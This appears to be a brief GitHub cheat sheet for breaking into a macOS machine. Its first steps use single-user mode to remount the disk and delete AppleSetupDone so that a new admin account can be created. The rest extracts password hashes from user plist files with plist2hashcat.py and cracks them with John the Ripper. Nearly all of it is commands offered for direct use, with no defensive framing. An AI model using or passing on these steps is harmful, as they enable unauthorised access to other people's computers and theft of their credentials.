# how to view
view in raw to get commands right cuz github doesn't give a crap about what goes on what line :)
# new admin user in single user mode
mount -uw /
rm /var/db/AppleSetupDone
*reboot*
# execute in terminal with root access
cd path/to/hashcat
sudo ./plist2hashcat.py /var/db/dslocal/nodes/default/users/*USER*.plist
save output to sha-512.txt in /path/to/JTR/run
cd path/to/JTR/run
./john --show --format=PBKDF2-HMAC-SHA512 sha-512.txt
